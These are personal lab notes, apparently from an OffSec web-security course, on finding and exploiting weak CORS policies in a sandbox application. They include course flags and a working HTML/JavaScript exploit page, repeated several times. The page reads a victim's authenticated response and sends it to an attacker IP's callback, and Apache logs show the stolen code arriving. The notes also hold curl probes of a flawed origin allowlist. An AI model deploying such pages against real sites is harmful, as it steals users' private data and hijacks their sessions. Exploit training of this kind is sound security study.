
This Learning Unit covers the following Learning Objectives:

1. Understand how to identify CORS response headers
2. Understand how CORS policies that trust arbitrary origins can be exploited
3. Understand how CORS policies that implement incomplete allowlists can be exploited

Due to CORS' very nature, web sites that enable it can leave themselves and their users open to CSRF-style attacks if there are any weaknesses or misconfigurations in the site's CORS settings. We will return to our sandbox application to examine these misconfigurations and the potential attacks they open up.

--------------
#### 6.6.1. Weak CORS Policies - Discovery
Let's start by making sure Burp Suite is open and we'll use its embedded browser. Next, we will access the CORS functionality of the practice application at `https://cors-sandbox/dashboard`.
![[Pasted image 20240814155639.png]]
In addition to supporting CORS, this application allows us configure the _HTTPOnly_, _Secure_, and _SameSite_ attributes of the session cookie. For now, we will select "None" for _SameSite_ and "True" for _Secure_ and _HTTPOnly_ before clicking _Get Cookie_.

We can use Burp Suite to verify the cookie was set according to the attributes we selected.

![[Pasted image 20240814155757.png]]

Next, we'll click on _Get Code_. When we inspect the response in Burp Suite, we find there are two CORS headers.
![[Pasted image 20240814155830.png]]
Notice the `ACCESS CONTROLS`
![[Pasted image 20240814155943.png]]
The presence of Access-Control headers indicates this application supports CORS at some level. Let's use Repeater to test the application further. In Burp Suite's HTTP history tab, we'll right-click on the GET request to /code and select _Send to Repeater_.
![[Pasted image 20240814160047.png]]
Next, let's click on the _Repeater_ tab and then click _Send_ to send the request to the server.

![[Pasted image 20240814160236.png]]

We now have a baseline request and response that we can use for additional testing. Our next step will be to determine what origins the applications trusts.

Before continuing to the next section, make sure to recreate the steps above to establish a baseline request and response within Burp Suite.

##### Labs
![[Pasted image 20240814160336.png]]
`6d84973e-5995-4557-95ed-a179beb9b5a4`
![[Pasted image 20240814160308.png]]

--------------
#### 6.6.2 Trusting Any Origin

We know the application supports CORS. Let's determine if we can access the secret code from an external domain. If we send a GET request to `/code` without a valid SessionCookie, we get the following response.

With a Session Cookie:
`Cookie: SessionCookie=1123581321345589144`
![[Pasted image 20240814160554.png]]
Without a Session Cookie:
![[Pasted image 20240814160636.png]]
Since we need to be authenticated to get the code, we need to send a valid SessionCookie on the request. A browser will not include credentials on a CORS request that is missing the _Access-Control-Allow-Credentials_ header. Additionally, the _Access-Control-Allow-Origin_ header being set to a wildcard (*) would overrule the _Access-Control-Allow-Credentials_ header even if it was set.

Our original request did not include an _Origin_ header. Let's try adding one and check how the application responds. We'll click _Go back_ in Repeater until we find our baseline request. We will add an _Origin_ header set to "hellocors" on the request and then click _Send_.
![[Pasted image 20240814161442.png]]

The response includes the Origin value we set and _Access-Control-Allow-Credentials_ set to "true".

This may seem odd initially, but there are valid reasons why a developer might want to allow multiple domains to access its resources in an authenticated manner. Remember, a wildcard value for the _Access-Control-Allow-Origin_ header doesn't allow _Access-Control-Allow-Credentials_ to be "true". If developers want their application to support multiple origin values, they must create unique solutions. Instead of responding with a wildcard, they could just respond with whatever the value of the origin is in the request.

We should be able to call the /code endpoint from an external domain. We will need to create an HTML page on our Kali host. We'll create a new file named `cors1.html` containing the following code and place it in `/var/www/html/`.

Basic Cors Exploit page:
`cors1.html`
```html
<html>
<head>
<script>
var url = "https://cors-sandbox/code";

function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    console.log(data);
  });
}

get_code();
</script>
</head>
<body></body>
</html>
```
The JavaScript function in this page uses the Fetch API to send a GET request to the /code endpoint using CORS mode and including credentials (cookies). The function then logs the JSON body of the CORS request to the console.

After making sure Apache is running, let's visit the CORS page in a new tab in our browser. We need to have a valid session cookie to the practice application in a separate tab. There's no immediate feedback on our CORS exploit, so let's check the browser console.

  
Tip:

Some browsers restrict cookies on cross-origin requests based on privacy settings. If the following examples do not work, you may need to modify settings in your browser to relax these controls for the **cors1.html** and **cors2.html** pages.

In Chrome and Chromium, you can enable _Third-party cookies_ after loading the page by clicking on _Not secure_, then _Cookies and site data_, and then toggling "Third-party cookies".

In Firefox, you may need to disable Enhanced Tracking Protection for the page by clicking on the shield icon next to the URL and then toggling "Enhanced Tracking Protection is ON for this site".

Accessing the hosted `http://127.0.0.1/cors1.html`
![[Pasted image 20240814170231.png]]
have to unblock the cookies in the top right
![[Pasted image 20240814170246.png]]
Refresh the page and we can now see the `COOKIE` in the `CONSOLE`
![[Pasted image 20240814170419.png]]
Here is the `cors1.html` being utilized in the browser
![[Pasted image 20240814170936.png]]
And here is it working
![[Pasted image 20240814171000.png]]

This example proves that JavaScript running on a different domain can access the results of a CORS request. In a real-world scenario, we wouldn't be able to inspect the victim's browser console. However, since JavaScript can access the response, we can update our page to send the secret code to an arbitrary domain. Let's create a copy of our HTML page and name it `cors2.html`. We'll update the function to send the result back to our Kali VM.

Add this into `cors1.html`:
```html
function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    fetch('http://your ip address/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors'
    });
  });
}
```

After Updated = `cors2.html` & save to `/var/www/html` - without comments
```html
<html>
<head>
<script>
var url = "https://cors-sandbox/code";

function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    fetch('http://192.168.45.175/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors'
    });
  });
}

get_code();
</script>
</head>
<body></body>
</html>
```
with comments
<html>
<head>
<script>
// Define the URL for fetching data
var url = "https://cors-sandbox/code";

// Function to fetch data from the defined URL
function get_code() {
  // Perform a GET request to the URL with CORS enabled and credentials included
  fetch(url, {
    method: 'GET',
    mode: 'cors',          // Enable Cross-Origin Resource Sharing (CORS)
    credentials: 'include' // Include credentials (e.g., cookies) in the request
  })
  .then(response => response.json()) // Convert the response to JSON
  .then(data => {
    // After receiving and parsing the JSON data, send it to another server
    fetch('http://192.168.45.175/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors' // Disable CORS for the callback request
    });
  });
}

// Call the function to initiate the fetch process
get_code();
</script>
</head>
<body></body>
</html>
<html>
<head>
<script>
// Define the URL for fetching data
var url = "https://cors-sandbox/code";

// Function to fetch data from the defined URL
function get_code() {
  // Perform a GET request to the URL with CORS enabled and credentials included
  fetch(url, {
    method: 'GET',
    mode: 'cors',          // Enable Cross-Origin Resource Sharing (CORS)
    credentials: 'include' // Include credentials (e.g., cookies) in the request
  })
  .then(response => response.json()) // Convert the response to JSON
  .then(data => {
    // After receiving and parsing the JSON data, send it to another server
    fetch('http://192.168.45.175/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors' // Disable CORS for the callback request
    });
  });
}

// Call the function to initiate the fetch process
get_code();
</script>
</head>
<body></body>
</html>
<html>
<head>
<script>
// Define the URL for fetching data
var url = "https://cors-sandbox/code";

// Function to fetch data from the defined URL
function get_code() {
  // Perform a GET request to the URL with CORS enabled and credentials included
  fetch(url, {
    method: 'GET',
    mode: 'cors',          // Enable Cross-Origin Resource Sharing (CORS)
    credentials: 'include' // Include credentials (e.g., cookies) in the request
  })
  .then(response => response.json()) // Convert the response to JSON
  .then(data => {
    // After receiving and parsing the JSON data, send it to another server
    fetch('http://192.168.45.175/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors' // Disable CORS for the callback request
    });
  });
}

// Call the function to initiate the fetch process
get_code();
</script>
</head>
<body></body>
</html>
```html
<html>
<head>
<script>
// Define the URL for fetching data
var url = "https://cors-sandbox/code";

// Function to fetch data from the defined URL
function get_code() {
  // Perform a GET request to the URL with CORS enabled and credentials included
  fetch(url, {
    method: 'GET',
    mode: 'cors',          // Enable Cross-Origin Resource Sharing (CORS)
    credentials: 'include' // Include credentials (e.g., cookies) in the request
  })
  .then(response => response.json()) // Convert the response to JSON
  .then(data => {
    // After receiving and parsing the JSON data, send it to another server
    fetch('http://192.168.45.175/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors' // Disable CORS for the callback request
    });
  });
}

// Call the function to initiate the fetch process
get_code();
</script>
</head>
<body></body>
</html>
```
We've included a Fetch call with the JSON body in the query string. We are using _JSON.stringify()_ to convert the JSON response into a String, then calling the _encodeURIComponent()_ function to encode any characters that might cause the URL to be invalid.


Burpsuite Initial `cors2.html` GET request
![[Pasted image 20240814171844.png]]
`GET` request receiving the `CODE` and `SESSION COOKIE`
![[Pasted image 20240814171921.png]]
Information being sent to `tail /var/log/apache2/access.log`
![[Pasted image 20240814172015.png]]
Let's test the page by accessing it in our browser. Again, the page has no indication of what happened. Let's check our access.log for Apache.
```bash
┌──(root💀gobots)-[14Aug2024 21:10:45]-[/home/kali/SUT/OSWA/cors]
└─# tail /var/log/apache2/access.log
192.168.1.1 - - [14/Aug/2024:19:36:14 +0000] "GET / HTTP/1.1" 200 10956 "-" "-"
192.168.45.175 - - [14/Aug/2024:20:20:18 +0000] "GET /cors1.html HTTP/1.1" 200 560 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
127.0.0.1 - - [14/Aug/2024:20:23:38 +0000] "GET /cors1.html HTTP/1.1" 200 560 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
127.0.0.1 - - [14/Aug/2024:20:23:38 +0000] "GET /favicon.ico HTTP/1.1" 404 487 "http://127.0.0.1/cors1.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
127.0.0.1 - - [14/Aug/2024:21:02:51 +0000] "GET /cors1.html HTTP/1.1" 200 560 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
127.0.0.1 - - [14/Aug/2024:21:03:47 +0000] "GET /cors1.html HTTP/1.1" 200 560 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
127.0.0.1 - - [14/Aug/2024:21:10:32 +0000] "GET /cors2.html HTTP/1.1" 404 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
127.0.0.1 - - [14/Aug/2024:21:10:47 +0000] "GET /cors2.html HTTP/1.1" 200 628 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
192.168.45.175 - - [14/Aug/2024:21:10:48 +0000] "GET /callback?%7B%22code%22%3A%226d84973e-5995-4557-95ed-a179beb9b5a4%22%2C%22status%22%3A%22ok%22%7D HTTP/1.1" 404 493 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
```
Excellent. Our CORS page sent a request to get the code on behalf of the victim user then sent the code to our Kali machine. While we played the role of the attacker and the victim, this example illustrates how to exploit permissive CORS settings to steal data from users. In real-world applications, attackers can exploit CORS to steal sensitive data, such as private messages or bank account numbers. They can also exploit CORS to perform actions as the user, such as transferring money or changing a password to completely compromise the victim's account.

##### Labs
![[Pasted image 20240814172527.png]]
`cors_exercise1.html` payload 
```html
<html>
<head>
<script>
var url = "https://cors-sandbox/exercise1";

function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    fetch('http://192.168.45.175/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors'
    });
  });
}

get_code();
</script>
</head>
<body></body>
</html>
```
Refreshing `cors` website
![[Pasted image 20240814172140.png]]
Calling `http://127.0.0.1/cors_exercise1.html` in new tab
![[Pasted image 20240814172210.png]]
what it looks like being called in `BURPSUITE`
![[Pasted image 20240814172256.png]]
Grabbing `FLAG` and `SESSION COOKIE` `OS{anyDomainWillDo}`
![[Pasted image 20240814172330.png]]
See that it is being sent back into the `apache2` log
![[Pasted image 20240814172423.png]]
`tail /var/log/apache2/access.log `
![[Pasted image 20240814172448.png]]

--------------
#### 6.6.3 Improper Domain Allowlist

The _Access-Control-Allow-Origin_ header can only set a single domain. When an application needs to support CORS with multiple origins, the application must include server-side logic to respond with the appropriate value. Applications usually need to inspect the _Origin_ header on a request to determine if it matches one of the allowed domains and then add the appropriate value in the _Access-Control-Allow-Origin_ header on the subsequent response. If the application contains logic errors in this functionality, it can introduce misconfigurations in the CORS policy.

Two common approaches that result in these misconfigurations are checking if the _Origin_ header on a request includes a preset value or ends with a preset value and then reflecting that header value.

Our practice application includes an additional endpoint with flawed allowlist functionality. Let's use curl to send a request to the endpoint. We'll set -X "OPTIONS" to send an OPTIONS request, -i to include headers on the output, -k to allow insecure server connections when using SSL, and finally, the URL.

```bash
┌──(root💀gobots)-[14Aug2024 21:24:32]-[/home/kali/SUT/OSWA/cors]
└─# curl -X "OPTIONS" -i -k https://cors-sandbox/allowlist 
HTTP/2 200 
access-control-allow-credentials: true
access-control-allow-methods: GET
access-control-allow-origin: https://offensive-security.com
content-type: text/html; charset=utf-8
date: Wed, 14 Aug 2024 22:44:21 GMT
server: waitress
content-length: 0
```
Response to OPTIONS request to /allowlist
![[Pasted image 20240814184519.png]]

We didn't specify an _Origin_ header on our request, but the server responded with an _Access-Control-Allow-Origin_ header with the value "https://offensive-security.com". Perhaps that is the only allowed origin. However, let's try sending a request with an _Origin_ header that includes a modification of that value. We'll use curl again and set -H Origin: http://www.offensive-security.com to add an _Origin_ header.

```bash
┌──(root💀gobots)-[14Aug2024 22:44:22]-[/home/kali/SUT/OSWA/cors]
└─# curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.com" -k https://cors-sandbox/allowlist
HTTP/2 200 
access-control-allow-credentials: true
access-control-allow-methods: GET
access-control-allow-origin: http://www.offensive-security.com
content-type: text/html; charset=utf-8
date: Wed, 14 Aug 2024 22:46:14 GMT
server: waitress
content-length: 0
```
Its now `http` instead of `https`
![[Pasted image 20240814184803.png]]
The server responded with an _Access-Control-Allow-Origin_ value that matches the value we submitted but we only changed the protocol and subdomain. Let's try modifying the end of it too.

```bash
┌──(root💀gobots)-[14Aug2024 22:46:14]-[/home/kali/SUT/OSWA/cors]
└─# curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.net" -k https://cors-sandbox/allowlist
HTTP/2 200 
access-control-allow-credentials: true
access-control-allow-methods: GET
access-control-allow-origin: https://offensive-security.com
content-type: text/html; charset=utf-8
date: Wed, 14 Aug 2024 22:48:51 GMT
server: waitress
content-length: 0
```

![[Pasted image 20240814184924.png]]

The server responded with the original _Access-Control-Allow-Origin_ value. It seems that changing the top-level domain[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/exploiting-weak-cors-policies-31300/improper-domain-allowlist-30982#fn-local_id_541-1) caused the server to respond with the default value. We were able to append a subdomain in Listing 25, but notice how the default does not include a subdomain.

What will happen if we alter the domain name by prepending something to change the domain name? Let's try it out. We'll use curl again and change the value of the _Origin_ header to `http://fakeoffensive-security.com`.

```bash
┌──(root💀gobots)-[14Aug2024 22:48:51]-[/home/kali/SUT/OSWA/cors]
└─# curl -X "OPTIONS" -i -H "Origin: http://fakeoffensive-security.com" -k https://cors-sandbox/allowlist
HTTP/2 200 
access-control-allow-credentials: true
access-control-allow-methods: GET
access-control-allow-origin: http://fakeoffensive-security.com
content-type: text/html; charset=utf-8
date: Wed, 14 Aug 2024 22:50:17 GMT
server: waitress
content-length: 0

```

![[Pasted image 20240814185033.png]]

The server used the Origin value we sent and set it in the _Access-Control-Allow-Origin_ header. The application seems to be allowing domains that end with "offensive-security.com", perhaps to allow for various subdomains. However, since it is not checking for a leading period, we can alter the domain name to something entirely different as long as it ends with "offensive-security.com". This type of misconfiguration can be more difficult to exploit as it relies on obtaining a specific domain to conduct the attack. However, crafting an HTML page and JavaScript to deliver a payload to exploit this misconfiguration is essentially the same as what we covered in the previous section.



##### Labs
![[Pasted image 20240814191715.png]]
Played with the curl commands learned in this section to see which one changed the `access-control-allow-origin:` when I changed the `ORIGIN` header.

Originally I tried `curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.net" -k https://cors-sandbox/exercise2`
 but it didnt change the `allow-origin`
![[Pasted image 20240814191932.png]]
this next one did `curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.com" -k https://cors-sandbox/exercise2`
![[Pasted image 20240814192057.png]]
Once we had the `ORIGIN` that would change it I navigated to the vulnerable page `http://cors-sandbox/exercise2` to get the packet in burpsuite
![[Pasted image 20240814192135.png]]
Got the `GET` to send to repeater
![[Pasted image 20240814192237.png]]
In repeater added the `Origin: http://www.offensive-security.com` header in the `GET` request and received the flag
![[Pasted image 20240814192317.png]]
`OS{whichPartIsTheDomain?}`
Testing to see if I can place the `ORIGIN` anywhere in the `GET` request

Placed at Bottom:
![[Pasted image 20240814192454.png]]
Placed at Top:
![[Pasted image 20240814192529.png]]